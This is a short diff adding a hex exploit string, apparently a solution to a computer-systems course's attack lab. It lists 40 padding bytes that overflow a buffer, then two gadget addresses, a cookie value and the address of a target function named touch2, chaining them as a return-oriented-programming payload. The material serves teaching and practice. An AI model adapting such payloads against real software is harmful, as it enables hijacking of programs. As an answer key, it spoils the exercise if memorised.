@@ -1,0 +1,17 @@
+/* 40 bytes to cause buffer overflow */
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00
+
+/* Address of Gadget 1 */
+ab 19 40 00 00 00 00 00
+
+/* Cookie */
+fa 97 b9 59 00 00 00 00
+
+/* Address of Gadget 2 */
+a2 19 40 00 00 00 00 00
+
+/* Address of `touch2` */
+ec 17 40 00 00 00 00 00
